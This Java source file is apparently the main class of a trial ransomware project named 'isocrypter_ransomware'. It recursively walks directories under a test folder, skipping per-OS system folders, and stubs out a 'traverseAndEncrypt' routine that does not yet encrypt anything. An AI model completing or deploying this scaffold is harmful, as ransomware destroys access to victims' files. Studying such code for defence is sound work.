package isocrypter_ransomware.src.main.java.com.iso53;

import java.io.File;
import java.util.HashSet;

class App {

    private static final String ROOT_PATH = "C:\\Users\\termi\\Desktop\\Ransomware Trial";

    private static HashSet<String> CURR_OS_EXCLUDED_FOLDERS;

    public static void main(String[] args) {

        CURR_OS_EXCLUDED_FOLDERS = OS.getCurrentOS() == OS.WINDOWS ? OS.Windows.getExcludedFolders()
                : OS.Linux.getExcludedFolders();
        traverseAndEncrypt(new File(ROOT_PATH).listFiles());
    }

    public static void traverseAndEncrypt(File[] files) {
        if (files == null) {
            return;
        }

        for (File file : files) {
            if (file.isDirectory()) {
                if (!CURR_OS_EXCLUDED_FOLDERS.contains(file.getName().toLowerCase())) {
                    // System.out.println("Directory: " + file.getAbsolutePath());
                    traverseAndEncrypt(file.listFiles());
                }
            } else {
                // System.out.println("File: " + file.getAbsolutePath());
            }
        }
    }

}